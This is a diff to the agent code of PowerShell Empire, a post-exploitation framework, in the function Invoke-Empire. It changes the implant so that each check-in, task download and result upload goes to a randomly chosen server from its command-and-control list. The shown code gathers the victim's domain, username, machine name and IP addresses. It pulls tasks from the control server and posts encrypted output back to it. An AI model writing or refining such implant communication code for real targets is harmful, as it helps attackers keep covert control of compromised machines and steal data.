@@ -208,7 +208,7 @@ function Invoke-Empire {
 
     # basic system information
     function Get-Sysinfo {
-        $str = $Servers[$ServerIndex]
+        $str = $Servers[(Get-Random -maximum $Servers.count)]
         $str += '|' + [Environment]::UserDomainName+'|'+[Environment]::UserName+'|'+[Environment]::MachineName;
         $p = (Get-WmiObject Win32_NetworkAdapterConfiguration|Where{$_.IPAddress}|Select -Expand IPAddress);
         $str += '|' +@{$true=$p[0];$false=$p}[$p.Length -lt 6];
@@ -607,8 +607,8 @@ function Invoke-Empire {
         if($packets) {
             # build and encrypt the response packet
             $encBytes = Encrypt-Bytes $packets
-
-            if($Servers[$ServerIndex].StartsWith("http")){
+            $tempIndex = (Get-Random -maximum $Servers.count)
+            if($Servers[$tempIndex].StartsWith("http")){
                 # build the web request object
                 $wc = new-object system.net.WebClient
                 # set the proxy settings for the WC to be the default system settings
@@ -621,7 +621,7 @@ function Invoke-Empire {
                 try{
                     # get a random posting URI
                     $taskURI = $script:TaskURIs | Get-Random
-                    $response = $wc.UploadData($Servers[$ServerIndex]+$taskURI,"POST",$encBytes);
+                    $response = $wc.UploadData($Servers[$tempIndex]+$taskURI,"POST",$encBytes);
                     # TODO: process response ID at all?
                 }
                 catch [System.Net.WebException]{
@@ -894,8 +894,8 @@ function Invoke-Empire {
     # get a task from the c2 server
     function Get-Task {
         try{
-
-            if ($Servers[$ServerIndex].StartsWith("http")){
+            $tempIndex = Get-Random -maximum $Servers.count
+            if ($Servers[$tempIndex].StartsWith("http")){
                 # build the web request object
                 $wc = new-object system.net.WebClient
                 # set the proxy settings for the WC to be the default system settings
@@ -907,7 +907,7 @@ function Invoke-Empire {
 
                 # choose a random valid URI for checkin
                 $taskURI = $script:TaskURIs | Get-Random
-                $result = $wc.DownloadData($Servers[$ServerIndex] + $taskURI)
+                $result = $wc.DownloadData($Servers[$tempIndex] + $taskURI)
                 $result
             }
         }
@@ -989,7 +989,7 @@ function Invoke-Empire {
             exit
         }
 
-        if($Servers[$ServerIndex].StartsWith("http")){
+        if($Servers[(Get-Random -maximum $Servers.count)].StartsWith("http")){
 
             # if there are working hours set, make sure we're operating within them
             #   format is "8:00,17:00"
